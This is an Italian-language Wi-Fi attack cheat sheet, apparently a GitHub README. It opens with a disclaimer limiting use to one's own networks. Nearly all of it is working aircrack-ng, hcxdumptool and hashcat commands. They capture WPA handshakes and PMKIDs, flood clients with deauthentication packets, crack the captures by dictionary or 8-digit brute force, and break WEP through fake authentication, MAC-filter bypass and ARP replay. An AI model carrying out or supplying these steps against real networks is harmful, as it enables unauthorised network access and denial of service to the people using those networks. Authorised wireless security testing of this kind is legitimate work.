# Pentesting Wi-Fi 
**ATTENZIONE:** eseguire queste operazioni **solo** su reti di tua proprietà o con permesso scritto. L’uso su reti altrui è illegale.
Visualizza scheda di rete 
```
ifconfig
```
oppure
```
ip a
```
Uccidere i processi di interferebilità
avvia scheda di rete in monitor mode
```
sudo airmon-ng check kill
```

```
sudo airmon-ng start wlan0
```
esempio:
wifi-revenge@kali:~# sudo airmon-ng start wlan0
avvia airodump-ng 
```
sudo airodump-ng wlan0mon 
```
copiare bssid e station
premi spazio oppure ctrl + c per terminare 
```
sudo airodump-ng --bssid FF:FF:FF:FF:FF:FF -c 1 -w /home/kali/handshake wlan0mon
```
esempio
```
sudo airodump-ng --<BSSID> -c <CANALE> -w <PERCORSO-FILE> <INTERFACCIA> 
```

scollegare clients a=bssid c=clients
```
sudo aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon
```
oppure 
```
sudo aireplay-ng --deauth 1000 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon
```
cracking con aircrack-ng 
```

sudo aircrack-ng file.cap -w /home/kali/rockyou.txt
```
hcxdumptool
```
sudo hcxdumptool -i wlan1 -w frames_to_recover_the_psk.pcapng -F --rds=1
```

![Screenshot_20250314_020018](https://github.com/user-attachments/assets/a105cd91-522b-4488-8dd4-29b5c7b6754a)

```
sudo hcxpcapngtool -o hash.hc22000 frames_to_recover_the_psk.pcapng
```
![Screenshot_20250314_015237](https://github.com/user-attachments/assets/eeed436d-d573-4c33-986f-15ea31dcf081)

mantieni solo la linea che ti interessa craccare
```
sudo nano hash.hc22000
```
crack con hashcat
```
hashcat -m 22000 -a 0 hash.hc22000 rockyou.txt
```
Bruteforce 8 numeri

```
hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d
```
WEP

### airodump-ng <BSSID> <CANALE> -w <PERCORSO-FILE> <INTERFACCIA>
```
airodump-ng --bssid FF:FF:FF:FF:FF:FF -c 1 -w /home/wifi-revenge/handshake
```
Autenticazione falsa su una rete WiFi con indirizzo MAC inesistente
### Fake-auth
sudo aireplay-ng --fakeauth 6000 -o 1 -q 10 -a <BSSID> -h <MAC> -e <ESSID>
```
aireplay-ng --fakeauth 6000 -o 1 -q 10 wlan0mon -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```
### Fake-auth — bypass MAC-filter
sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <MAC_CLONATO> -e <ESSID> <IFACE_MON>
```
aireplay-ng --fakeauth 0 wlan0mon -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```
### ARP-replay
sudo aireplay-ng --arpreplay -b <BSSID> -h <MAC> <IFACE_MON>
```
aireplay-ng --arpreplay wlan0mon -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
aireplay-ng -3 wlan0mon -e essid -a FF:FF:FF:FF:FF:FF -h FF:FF:FF:FF:FF:FF
```

cracking con aircrack-ng
```
aircrack-ng output*.cap
```

**Non usare** `FF:FF:FF:FF:FF:FF` per `-a`/`-b` (BSSID) o `-h` (MAC).

































